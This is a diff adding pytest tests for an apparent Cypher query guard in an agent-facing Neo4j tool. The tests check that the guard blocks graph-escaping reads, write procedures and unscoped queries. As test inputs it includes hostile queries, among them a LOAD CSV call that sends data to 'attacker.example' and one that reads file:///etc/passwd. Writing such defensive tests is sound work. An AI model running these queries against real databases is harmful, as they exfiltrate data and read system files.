@@ -35,3 +35,48 @@ def test_plain_read_is_allowed():
     assert not _has_write_keyword(
         "MATCH (f:CpgFile {scan_id:$scan_id}) RETURN f.file_path ORDER BY f.file_path"
     )
+
+
+# ── reads that escape the graph, procedures, and scan scoping ──────────
+from orion.graphdb import blocked_reason, scope_problem  # noqa: E402
+
+
+def test_escaping_reads_and_batch_writes_are_blocked():
+    for q in (
+        "LOAD CSV FROM 'https://attacker.example/x?d=' + 'secret' AS row RETURN row",
+        "load   csv with headers from 'file:///etc/passwd' as r return r",
+        "MATCH (n {scan_id:$scan_id}) FOREACH (x IN [1] | SET n.p = x)",
+        "CALL { MATCH (n {scan_id:$scan_id}) RETURN n } IN TRANSACTIONS RETURN 1",
+        "USING PERIODIC COMMIT LOAD CSV FROM 'x' AS r RETURN r",
+    ):
+        assert blocked_reason(q), q
+
+
+def test_only_read_only_procedures_are_allowed():
+    for q in ("CALL dbms.setConfigValue('x', 'y')", "CALL apoc.load.json('https://x')",
+              "CALL db.createLabel('X')", "CALL db.index.fulltext.createNodeIndex('i', ['A'], ['p'])"):
+        assert blocked_reason(q), q
+    for q in ("CALL db.schema.nodeTypeProperties()", "CALL db.labels() YIELD label RETURN label",
+              "CALL db.index.vector.queryNodes('chunk_embedding', 5, $v) YIELD node RETURN node",
+              "MATCH (c:CpgCall {scan_id:$scan_id}) CALL { WITH c RETURN c.name AS n } RETURN n"):
+        assert blocked_reason(q) is None, q
+
+
+def test_keywords_inside_literals_and_backticks_stay_allowed():
+    assert blocked_reason("MATCH (c {scan_id:$scan_id}) WHERE c.code CONTAINS 'LOAD CSV FROM' RETURN c") is None
+    assert blocked_reason("MATCH (c {scan_id:$scan_id}) RETURN c.`CALL dbms.x` AS v") is None
+
+
+def test_agent_queries_must_be_scan_scoped():
+    sid = "a" * 40
+    assert scope_problem("MATCH (c:CpgCall) RETURN count(c)", sid)
+    assert scope_problem("MATCH (c:CpgCall) WHERE c.code CONTAINS '$scan_id' RETURN c", sid)  # literal
+    assert scope_problem("MATCH (c:CpgCall {scan_id:$scan_id}) RETURN count(c)", sid) is None
+    assert scope_problem(f"MATCH (c:CpgCall {{scan_id:'{sid}'}}) RETURN count(c)", sid) is None
+    assert scope_problem("CALL db.schema.nodeTypeProperties()", sid) is None     # no MATCH
+
+
+def test_mcp_tool_refuses_unscoped_query_before_touching_neo4j():
+    from orion.mcp_server import run_cypher_impl
+    result = run_cypher_impl("MATCH (n) RETURN n", "any-scan")
+    assert "unscoped query" in result["error"]
